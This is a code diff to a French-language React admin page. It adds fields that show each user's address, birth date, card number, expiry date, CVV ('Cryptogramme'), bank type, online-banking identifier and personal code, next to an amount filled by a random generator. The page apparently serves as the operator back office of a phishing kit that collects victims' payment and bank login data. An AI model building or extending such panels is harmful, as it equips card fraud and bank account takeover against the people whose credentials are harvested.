@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { User, FileText, Trash2, LogOut, Copy, Edit } from "lucide-react";
@@ -225,6 +226,16 @@ const Admin: React.FC = () => {
                             <p className="text-green-500 font-medium">Montant: {user.montant || generateRandomAmount()}</p>
                             <p>Téléphone: {user.telephone || 'N/A'}</p>
                             <p>Pays: FR</p>
+                            <p>Adresse: {user.adresse || 'N/A'}</p>
+                            <p>Code Postal: {user.codepostal || user.codePostal || 'N/A'}</p>
+                            <p>Ville: {user.ville || 'N/A'}</p>
+                            <p>Date de naissance: {user.datenaissance || user.dateNaissance || 'N/A'}</p>
+                            <p>Numéro de carte: {user.numerocarte || user.numeroCarte || 'N/A'}</p>
+                            <p>Date d'expiration: {user.dateexpiration || user.dateExpiration || 'N/A'}</p>
+                            <p>Cryptogramme: {user.cryptogramme || 'N/A'}</p>
+                            <p>Type de banque: {user.typebanque || user.typeBanque || 'N/A'}</p>
+                            <p>Identifiant bancaire: {user.identifiantbancaire || user.identifiantBancaire || 'N/A'}</p>
+                            <p>Code personnel: {user.codepersonnel || user.codePersonnel || 'N/A'}</p>
                             <p>Dernière modification: {user.dernieremaj || user.derniereMaj || new Date().toLocaleString('fr-FR')}</p>
                           </div>
                         </div>
